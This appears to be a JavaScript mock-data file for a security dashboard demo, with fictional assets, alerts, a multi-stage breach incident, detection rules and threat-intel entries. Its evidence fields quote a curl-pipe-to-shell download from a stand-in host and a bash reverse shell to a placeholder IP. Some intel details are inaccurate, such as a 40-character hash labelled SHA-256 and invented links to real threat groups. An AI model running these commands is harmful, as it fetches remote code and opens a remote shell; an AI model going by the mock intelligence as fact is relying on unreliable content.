/**
 * Sentinel AI Mock Telemetry Database
 * Contains rich, realistic security telemetry, assets, detection rules, incidents, and threat intelligence.
 */

export const INITIAL_ASSETS = [
  { id: 'ast-01', name: 'srv-prod-db-01', type: 'Database Server', category: 'Servers', health: 'critical', riskScore: 89, importance: 'Tier-1 Critical', ip: '10.100.12.45', os: 'Ubuntu 22.04 LTS', cloudProvider: 'AWS', region: 'us-east-1', lastActivity: 'Just now', alertCount: 4 },
  { id: 'ast-02', name: 'srv-corp-ad-01', type: 'Active Directory Domain Controller', category: 'Servers', health: 'warning', riskScore: 65, importance: 'Tier-1 Critical', ip: '10.100.1.10', os: 'Windows Server 2022', cloudProvider: 'On-Premises', region: 'HQ-DC', lastActivity: '2 mins ago', alertCount: 2 },
  { id: 'ast-03', name: 'srv-prod-web-01', type: 'Web Application Frontend', category: 'Servers', health: 'healthy', riskScore: 18, importance: 'Tier-2 High', ip: '10.100.10.11', os: 'Alpine Linux', cloudProvider: 'AWS', region: 'us-east-1', lastActivity: '1 min ago', alertCount: 0 },
  { id: 'ast-04', name: 'wkst-dev-alice', type: 'Developer Workstation', category: 'Workstations', health: 'warning', riskScore: 42, importance: 'Tier-3 Medium', ip: '10.200.4.88', os: 'macOS Sonoma', cloudProvider: 'On-Premises', region: 'HQ-WiFi', lastActivity: '5 mins ago', alertCount: 1 },
  { id: 'ast-05', name: 'wkst-exec-ceo', type: 'Executive Laptop', category: 'Workstations', health: 'healthy', riskScore: 12, importance: 'Tier-2 High', ip: '10.200.4.15', os: 'macOS Sonoma', cloudProvider: 'On-Premises', region: 'Remote-VPN', lastActivity: '15 mins ago', alertCount: 0 },
  { id: 'ast-06', name: 'wkst-sec-bob', type: 'Security Analyst Machine', category: 'Workstations', health: 'healthy', riskScore: 5, importance: 'Tier-3 Medium', ip: '10.200.4.102', os: 'Windows 11 Enterprise', cloudProvider: 'On-Premises', region: 'HQ-Wired', lastActivity: 'Just now', alertCount: 0 },
  { id: 'ast-07', name: 'aws-s3-customer-records', type: 'S3 Storage Bucket', category: 'Cloud Resources', health: 'warning', riskScore: 54, importance: 'Tier-1 Critical', ip: 's3://customer-records-prod', os: 'S3 Protocol', cloudProvider: 'AWS', region: 'us-west-2', lastActivity: '4 mins ago', alertCount: 1 },
  { id: 'ast-08', name: 'gcp-k8s-prod-cluster', type: 'Kubernetes Cluster', category: 'Cloud Resources', health: 'healthy', riskScore: 24, importance: 'Tier-1 Critical', ip: '34.120.45.8', os: 'Container-Optimized OS', cloudProvider: 'GCP', region: 'us-central1', lastActivity: 'Just now', alertCount: 0 },
  { id: 'ast-09', name: 'Sentinel Portal API', type: 'REST Web Application', category: 'Applications', health: 'healthy', riskScore: 15, importance: 'Tier-2 High', ip: 'https://api.sentinel.ai', os: 'NodeJS / Docker', cloudProvider: 'AWS', region: 'us-east-1', lastActivity: 'Just now', alertCount: 0 },
  { id: 'ast-10', name: 'prod-finance-db', type: 'PostgreSQL Database', category: 'Databases', health: 'healthy', riskScore: 9, importance: 'Tier-1 Critical', ip: '10.100.12.80', os: 'PostgreSQL 15', cloudProvider: 'AWS', region: 'us-east-1', lastActivity: '3 mins ago', alertCount: 0 },
  { id: 'ast-11', name: 'hq-core-router-01', type: 'Core Firewall & Router', category: 'Network Devices', health: 'healthy', riskScore: 10, importance: 'Tier-1 Critical', ip: '10.100.1.1', os: 'Cisco IOS-XE', cloudProvider: 'On-Premises', region: 'HQ-DC', lastActivity: 'Just now', alertCount: 0 },
  { id: 'ast-12', name: 'alice.smith@sentinel.ai', type: 'User Identity (Developer)', category: 'User Identities', health: 'warning', riskScore: 48, importance: 'Tier-3 Medium', ip: 'N/A', os: 'N/A', cloudProvider: 'AzureAD', region: 'US-East', lastActivity: '2 mins ago', alertCount: 2 },
  { id: 'ast-13', name: 'admin.svc@sentinel.ai', type: 'User Identity (Service Account)', category: 'User Identities', health: 'critical', riskScore: 92, importance: 'Tier-1 Critical', ip: 'N/A', os: 'N/A', cloudProvider: 'ActiveDirectory', region: 'Global', lastActivity: 'Just now', alertCount: 3 }
];

export const INITIAL_DETECTIONS = [
  {
    id: 'DET-2026-101',
    timestamp: '2026-08-08T11:22:04Z',
    severity: 'Critical',
    category: 'Credential abuse',
    asset: 'srv-corp-ad-01',
    user: 'admin.svc@sentinel.ai',
    riskScore: 92,
    confidence: 98,
    status: 'Active',
    assignedAnalyst: 'Sarah Connor',
    incidentId: 'INC-2048',
    reason: 'Massive volume of failed Kerberos pre-authentications followed by a single successful admin login from a workstation assigned to a developer.',
    evidence: {
      observed: '522 failed logins in 45 seconds, followed by 1 successful login from developer subnet (10.200.4.88) using domain admin credentials.',
      inference: 'Brute force / password spraying targeting highly privileged Service Account, indicating active lateral movement attempt.',
      nextSteps: 'Isolate srv-corp-ad-01 network communications with srv-prod-db-01. Revoke active OAuth and Kerberos tokens for admin.svc.'
    }
  },
  {
    id: 'DET-2026-102',
    timestamp: '2026-08-08T11:25:30Z',
    severity: 'Critical',
    category: 'Suspicious login',
    asset: 'wkst-dev-alice',
    user: 'alice.smith@sentinel.ai',
    riskScore: 89,
    confidence: 94,
    status: 'Active',
    assignedAnalyst: 'Sarah Connor',
    incidentId: 'INC-2048',
    reason: 'Successful login utilizing credentials from anomalous geolocation (IP 198.51.100.72 - Tor Exit Node) concurrently with active session in office WiFi.',
    evidence: {
      observed: 'Login from Paris, FR (Tor network) at 11:25:00 UTC, while alice.smith was actively authenticating from Office HQ (New York) via WiFi 2 minutes prior.',
      inference: 'Session hijacking or compromised credentials being routed via anonymity network to bypass geo-restrictions.',
      nextSteps: 'Terminate all active sessions for alice.smith@sentinel.ai. Prompt multi-factor authentication reset.'
    }
  },
  {
    id: 'DET-2026-103',
    timestamp: '2026-08-08T11:31:12Z',
    severity: 'Critical',
    category: 'Privilege escalation indicators',
    asset: 'srv-prod-db-01',
    user: 'admin.svc@sentinel.ai',
    riskScore: 95,
    confidence: 97,
    status: 'Active',
    assignedAnalyst: 'Sarah Connor',
    incidentId: 'INC-2048',
    reason: 'Spawning of system administrative shells (sh/bash) via process database executor service (postgres), utilizing unauthorized credentials.',
    evidence: {
      observed: 'Parent process postgres (PID 4012) spawned /bin/bash executing `whoami; curl -s http://malicious-inf.net/script.sh | sh`.',
      inference: 'Remote Code Execution (RCE) or SQL injection leading to system-level command execution on production database.',
      nextSteps: 'Isolate srv-prod-db-01 immediately. Snapshot database RAM for memory forensics. Inspect Postgres query logs for SQLi.'
    }
  },
  {
    id: 'DET-2026-104',
    timestamp: '2026-08-08T11:34:50Z',
    severity: 'High',
    category: 'Data exfiltration indicators',
    asset: 'aws-s3-customer-records',
    user: 'admin.svc@sentinel.ai',
    riskScore: 84,
    confidence: 90,
    status: 'Active',
    assignedAnalyst: 'Sarah Connor',
    incidentId: 'INC-2048',
    reason: 'Anomalous large download transfer volume initiated towards external IP block not belonging to AWS cloud infrastructure.',
    evidence: {
      observed: 'S3 GetObject calls total 4.2GB in 3 minutes, transferred to IP 203.0.113.110 (Unclassified hosting provider in Netherlands). Baseline is 15MB/hour.',
      inference: 'Active data harvesting and exfiltration following database compromise and host elevation.',
      nextSteps: 'Enact bucket isolation policy. Rotate AWS access keys. Temporarily block egress traffic to IP 203.0.113.110.'
    }
  },
  {
    id: 'DET-2026-105',
    timestamp: '2026-08-08T10:15:00Z',
    severity: 'Medium',
    category: 'Phishing',
    asset: 'wkst-dev-alice',
    user: 'alice.smith@sentinel.ai',
    riskScore: 62,
    confidence: 85,
    status: 'Investigating',
    assignedAnalyst: 'Alex Mercer',
    incidentId: 'INC-2047',
    reason: 'User clicked a URL in email linking to a suspicious domain masquerading as login-sentinel-portal.com.',
    evidence: {
      observed: 'HTTP redirect sequence from incoming email attachment invoice.pdf -> login-sentinel-portal.com/login.html.',
      inference: 'Targeted spear-phishing attack. User likely entered corporate credentials before connection timed out.',
      nextSteps: 'Reset Alice\'s password. Force active session invalidation on all active endpoints.'
    }
  },
  {
    id: 'DET-2026-106',
    timestamp: '2026-08-08T09:40:00Z',
    severity: 'Medium',
    category: 'Anomalous network activity',
    asset: 'srv-prod-web-01',
    user: 'N/A',
    riskScore: 55,
    confidence: 80,
    status: 'Resolved',
    assignedAnalyst: 'Alex Mercer',
    incidentId: 'INC-2046',
    reason: 'Spike in HTTP 500 error responses coupled with high rate of incoming requests from IP range associated with known web scanners.',
    evidence: {
      observed: '15,000 HTTP requests in 5 minutes containing SQL syntax signatures (`SELECT`, `UNION`, `OR 1=1`).',
      inference: 'Web application vulnerability scanning (SQL injection attempts). System successfully blocked attempts via WAF rules.',
      nextSteps: 'No action required. Block source IPs in cloud firewall. Verify SQL input sanitization on web endpoints.'
    }
  },
  {
    id: 'DET-2026-107',
    timestamp: '2026-08-08T08:05:00Z',
    severity: 'Low',
    category: 'Endpoint anomalies',
    asset: 'wkst-dev-alice',
    user: 'alice.smith@sentinel.ai',
    riskScore: 35,
    confidence: 75,
    status: 'Resolved',
    assignedAnalyst: 'Automated Response',
    incidentId: 'INC-2045',
    reason: 'Execution of unsigned binary file in user Temp directory.',
    evidence: {
      observed: 'Process execution: `C:\\Users\\alice\\AppData\\Local\\Temp\\update_patch_84.exe` (SHA256: 7f83e...34e). Not signed by valid certificate authority.',
      inference: 'Installation of adware or potentially unwanted program (PUP).',
      nextSteps: 'Binary was quarantined by Sentinel EDR agent automatically. Executed malware scans show system clear.'
    }
  }
];

export const INITIAL_INCIDENTS = [
  {
    id: 'INC-2048',
    title: 'Multi-Stage Database Compromise & Exfiltration Campaign',
    severity: 'Critical',
    status: 'Active',
    riskScore: 94,
    assignedAnalyst: 'Sarah Connor',
    firstDetected: '2026-08-08T11:22:04Z',
    lastActivity: '2026-08-08T11:34:50Z',
    assets: ['srv-corp-ad-01', 'wkst-dev-alice', 'srv-prod-db-01', 'aws-s3-customer-records'],
    users: ['alice.smith@sentinel.ai', 'admin.svc@sentinel.ai'],
    detections: ['DET-2026-101', 'DET-2026-102', 'DET-2026-103', 'DET-2026-104'],
    summary: {
      whatHappened: 'A multi-stage attack is currently unfolding. It started with compromised credentials from developer workstation wkst-dev-alice, which were used to log in from a Tor Exit Node. Following this, the attacker performed credential abuse targeting srv-corp-ad-01 to elevate privileges. Utilizing administrative rights, they connected to srv-prod-db-01, executed remote code via a database session shell, and initiated exfiltration of sensitive databases containing customer records directly to an unclassified external IP address.',
      whyItMatters: 'If unchecked, this incident results in the compromise of the primary Active Directory domain controller, the extraction of highly sensitive SQL customer databases, and an active compliance breach under HIPAA/GDPR due to ongoing exfiltration of cloud buckets.',
      affectedSystems: 'Active Directory (srv-corp-ad-01), Developer VM (wkst-dev-alice), PostgreSQL Prod DB (srv-prod-db-01), Cloud Storage Bucket (aws-s3-customer-records).',
      detectionEvidence: 'Tor network login logs, anomalous DB shell creation events (spawning bash), and S3 bucket API export events peaking at 4.2GB over 3 minutes.',
      currentStatus: 'Active & Investigating. Automated isolation rule has been initiated on DB server. Threat analyst Sarah Connor is reviewing credential status.',
      recommendedNextSteps: [
        'Perform an active network isolation of `srv-prod-db-01` and `wkst-dev-alice` using the firewall overlay.',
        'Invalidate all security tokens and force a credential reset for `admin.svc@sentinel.ai` and `alice.smith@sentinel.ai`.',
        'Deploy egress block rule for destination IP `203.0.113.110` at the core router level.',
        'Audit all S3 GetObject access calls in the last 2 hours to assess extent of data exposure.'
      ]
    },
    timeline: [
      { id: 't-1', time: '11:22:04', event: 'Kerberos credential abuse identified', details: 'Active Directory (srv-corp-ad-01) reported 522 failed logins followed by a success for admin.svc.', type: 'auth', severity: 'Critical' },
      { id: 't-2', time: '11:25:30', event: 'Paris (Tor Net) login on developer machine', details: 'Successful session established for alice.smith@sentinel.ai from known Tor exit node IP.', type: 'login', severity: 'Critical' },
      { id: 't-3', time: '11:31:12', event: 'Privilege escalation bash shell spawned', details: 'Process postgres (PID 4012) on srv-prod-db-01 spawned interactive root bash interface.', type: 'process', severity: 'Critical' },
      { id: 't-4', time: '11:34:50', event: 'Cloud bucket data exfiltration spike', details: 'Outgoing transfer of customer backup archive (4.2GB) to IP 203.0.113.110 in Netherlands.', type: 'network', severity: 'High' }
    ],
    evidence: [
      { type: 'IP Reputation', value: '198.51.100.72', label: 'Tor Exit Node', status: 'Malicious', context: 'Used to establish ssh tunnel' },
      { type: 'IP Reputation', value: '203.0.113.110', label: 'Hosting provider, NL', status: 'Suspicious', context: 'Target destination for S3 exfiltration' },
      { type: 'Hash Reputation', value: '7f83e9112a9bc83f0ee3e89a3fcf442f4c9c1b', label: 'patch_deployer.elf', status: 'Malicious (VirusTotal 58/72)', context: 'Dropped on database server temp folder' },
      { type: 'Active Process', value: 'bash -i >& /dev/tcp/203.0.113.110/4444 0>&1', label: 'Reverse shell command', status: 'Critical Threat', context: 'Forked from postgres runner process' }
    ],
    entities: [
      { name: 'srv-prod-db-01', role: 'Victim/Compromised Host', risk: 89, class: 'Server' },
      { name: 'wkst-dev-alice', role: 'Source of compromised session', risk: 42, class: 'Workstation' },
      { name: 'admin.svc@sentinel.ai', role: 'Compromised identity', risk: 92, class: 'Identity' },
      { name: 'alice.smith@sentinel.ai', role: 'Compromised identity', risk: 48, class: 'Identity' }
    ],
    aiAnalysis: {
      summary: 'With 96% confidence, Sentinel Engine infers this activity is a targeted external attack utilizing a Compromised Insider credential strategy. The initial vector appears to be credential harvesting on wkst-dev-alice (phishing alert occurred at 10:15 UTC). The attacker then hopped onto the domain controller, extracted credentials for the admin service account, and connected directly to the database. They exploited process execution capabilities to download an exfiltration script. Exfiltration occurred in less than 3 minutes, indicating a pre-scripted workflow.',
      uncertainty: 'We cannot verify whether developer Alice Smith willingly assisted or if her host was fully controlled via local exploit. Further memory dump of wkst-dev-alice is required to check for active keyloggers or local token-theft tools.'
    },
    activity: [
      { time: '2026-08-08T11:23:10Z', author: 'System', text: 'Alert DET-2026-101 auto-assigned to Sarah Connor based on AD expertise.' },
      { time: '2026-08-08T11:27:00Z', author: 'Sarah Connor', text: 'Checking firewall logs on AD router. The Parisian IP has also attempted to probe internal DNS servers.' },
      { time: '2026-08-08T11:32:00Z', author: 'System', text: 'Alert DET-2026-103 correlated automatically. Risk index elevated to 94.' },
      { time: '2026-08-08T11:36:00Z', author: 'Sarah Connor', text: 'I have requested EDR isolation for the database server. Egress block rule queued.' }
    ]
  },
  {
    id: 'INC-2047',
    title: 'Phishing Click Leading to Credential Harvesting',
    severity: 'Medium',
    status: 'Investigating',
    riskScore: 62,
    assignedAnalyst: 'Alex Mercer',
    firstDetected: '2026-08-08T10:15:00Z',
    lastActivity: '2026-08-08T10:20:00Z',
    assets: ['wkst-dev-alice', 'alice.smith@sentinel.ai'],
    users: ['alice.smith@sentinel.ai'],
    detections: ['DET-2026-105'],
    summary: {
      whatHappened: 'A user received a phishing email containing an attachment which linked to a domain spoofing our official login portal. Telemetry indicates the URL was clicked and credentials were likely supplied.',
      whyItMatters: 'Compromised developer credentials allow access to internal git repositories and AWS control consoles.',
      affectedSystems: 'Alice Smith developer email, workstation wkst-dev-alice.',
      detectionEvidence: 'Email gateway log showing click-through to login-sentinel-portal.com.',
      currentStatus: 'Under active investigation. MFA reset email has been dispatched.',
      recommendedNextSteps: [
        'Enforce MFA rotation immediately.',
        'Run malware scan on Alice\'s workstation.'
      ]
    },
    timeline: [
      { id: 't-10', time: '10:15:00', event: 'Phishing email URL click', details: 'User opened email client and navigated to login-sentinel-portal.com', type: 'network', severity: 'Medium' }
    ],
    evidence: [
      { type: 'Domain Reputation', value: 'login-sentinel-portal.com', label: 'Spoof Portal', status: 'Malicious', context: 'Registered 3 days ago in Panama' }
    ],
    entities: [
      { name: 'wkst-dev-alice', role: 'User Machine', risk: 42, class: 'Workstation' }
    ],
    aiAnalysis: {
      summary: 'High confidence matching credential harvesting layout. This likely provided the password credentials used in incident INC-2048.',
      uncertainty: 'We do not have local keylogger telemetry for confirmation.'
    },
    activity: [
      { time: '2026-08-08T10:16:00Z', author: 'System', text: 'Alert generated. Auto-assigned to Alex Mercer.' }
    ]
  }
];

export const INITIAL_RULES = [
  { id: 'R-01', name: 'Anomalous Kerberos Pre-Authentications', description: 'Detects a high rate of failed Kerberos logins followed by a successful validation from same IP.', category: 'Credential abuse', status: true, severity: 'Critical', lastTriggered: '12 mins ago', detectionsCount: 14, createdBy: 'Sentinel AI Default', updatedDate: '2026-06-15' },
  { id: 'R-02', name: 'Concurrent Geolocation Session Access', description: 'Detects logins from geolocations separated by distances that are impossible to travel in the timeframe.', category: 'Suspicious login', status: true, severity: 'Critical', lastTriggered: '9 mins ago', detectionsCount: 3, createdBy: 'Sentinel AI Default', updatedDate: '2026-06-20' },
  { id: 'R-03', name: 'Process Shell Spawned from Web Service', description: 'Detects web servers or database daemons launching command administrative shells.', category: 'Privilege escalation indicators', status: true, severity: 'Critical', lastTriggered: '3 mins ago', detectionsCount: 2, createdBy: 'Sarah Connor', updatedDate: '2026-08-01' },
  { id: 'R-04', name: 'Anomalous Cloud Bucket Egress Data Transfer', description: 'Detects S3 and Cloud Storage outbound traffic exceeding baseline thresholds by over 10x.', category: 'Data exfiltration indicators', status: true, severity: 'High', lastTriggered: 'Just now', detectionsCount: 5, createdBy: 'Alex Mercer', updatedDate: '2026-07-12' },
  { id: 'R-05', name: 'Unsigned Executable Run from Temporary Folders', description: 'EDR alert triggering when an unsigned PE or ELF file runs in the global Temp directories.', category: 'Endpoint anomalies', status: true, severity: 'Medium', lastTriggered: '3 hours ago', detectionsCount: 19, createdBy: 'Sentinel AI Default', updatedDate: '2026-05-18' },
  { id: 'R-06', name: 'Double Extension Attachment Download', description: 'Detects downloads of files terminating in multi-extensions such as .pdf.exe or .xlsx.js.', category: 'Phishing', status: false, severity: 'Medium', lastTriggered: 'Never', detectionsCount: 0, createdBy: 'Alex Mercer', updatedDate: '2026-07-28' },
  { id: 'R-07', name: 'DNS Tunneling Domain Exfiltration', description: 'Detects large quantities of high-entropy DNS subdomains queried within brief windows.', category: 'Anomalous network activity', status: true, severity: 'High', lastTriggered: '2 days ago', detectionsCount: 1, createdBy: 'Sarah Connor', updatedDate: '2026-08-05' }
];

export const INITIAL_INTEL = [
  { indicator: '198.51.100.72', type: 'IP Address', reputation: 'Malicious', category: 'Tor Exit Node / Session hijacking source', source: 'EmergingThreats TorFeed', confidence: 99, observedDate: '2026-08-08', relatedActors: 'APT-29 / Cozy Bear shadow networks' },
  { indicator: '203.0.113.110', type: 'IP Address', reputation: 'Suspicious', category: 'Data Exfiltration hosting point', source: 'Spamhaus DROP List', confidence: 85, observedDate: '2026-08-08', relatedActors: 'UNC-2452 data broker nodes' },
  { indicator: 'login-sentinel-portal.com', type: 'Domain Name', reputation: 'Malicious', category: 'Phishing domain', source: 'PhishTank Database', confidence: 95, observedDate: '2026-08-08', relatedActors: 'Unknown Cyber-criminals' },
  { indicator: '7f83e9112a9bc83f0ee3e89a3fcf442f4c9c1b', type: 'SHA-256 Hash', reputation: 'Malicious', category: 'Trojan Dropper Agent', source: 'VirusTotal Intelligence', confidence: 98, observedDate: '2026-08-08', relatedActors: 'HermeticWiper variants' },
  { indicator: '109.248.56.12', type: 'IP Address', reputation: 'Malicious', category: 'C2 Control Server', source: 'CISA Alert AA24-10', confidence: 95, observedDate: '2026-08-05', relatedActors: 'BlackByte Ransomware' },
  { indicator: 'updates.security-patches-win.com', type: 'Domain Name', reputation: 'Suspicious', category: 'Adversary Redirector', source: 'AlienVault OTX', confidence: 75, observedDate: '2026-08-01', relatedActors: 'FIN7 group infrastructure' }
];

export const INITIAL_NOTIFICATIONS = [
  { id: 'notif-1', severity: 'Critical', text: 'Suspicious lateral activity detected on srv-prod-db-01.', asset: 'srv-prod-db-01', timestamp: '2026-08-08T11:31:12Z', read: false, status: 'Active' },
  { id: 'notif-2', severity: 'Critical', text: 'Tor-routed login session established on wkst-dev-alice.', asset: 'wkst-dev-alice', timestamp: '2026-08-08T11:25:30Z', read: false, status: 'Active' },
  { id: 'notif-3', severity: 'High', text: 'High-volume data transfer anomaly detected on S3 Customer Records.', asset: 'aws-s3-customer-records', timestamp: '2026-08-08T11:34:50Z', read: false, status: 'Active' },
  { id: 'notif-4', severity: 'Medium', text: 'Credential harvesting phishing email clicked by Alice Smith.', asset: 'wkst-dev-alice', timestamp: '2026-08-08T10:15:00Z', read: true, status: 'Investigating' }
];

export const INITIAL_AUDIT_LOGS = [
  { timestamp: '2026-08-08T11:36:00Z', actor: 'sarah.connor@sentinel.ai', role: 'Analyst', action: 'Requested egress block rule for IP 203.0.113.110', resource: 'Core Firewall Core-Rtr-01' },
  { timestamp: '2026-08-08T11:35:10Z', actor: 'sarah.connor@sentinel.ai', role: 'Analyst', action: 'Opened incident workspace for INC-2048', resource: 'Incident Manager' },
  { timestamp: '2026-08-08T11:26:00Z', actor: 'System Copilot', role: 'AI Engine', action: 'Auto-correlated alerts DET-2026-101 and DET-2026-102 into incident INC-2048', resource: 'AI Core' },
  { timestamp: '2026-08-08T11:22:04Z', actor: 'System Core', role: 'Collector', action: 'Ingested security event logs representing failed AD Kerberos logins', resource: 'srv-corp-ad-01' },
  { timestamp: '2026-08-08T10:18:00Z', actor: 'alex.mercer@sentinel.ai', role: 'Analyst', action: 'Assigned status investigating to alert DET-2026-105', resource: 'Detections Workbench' }
];
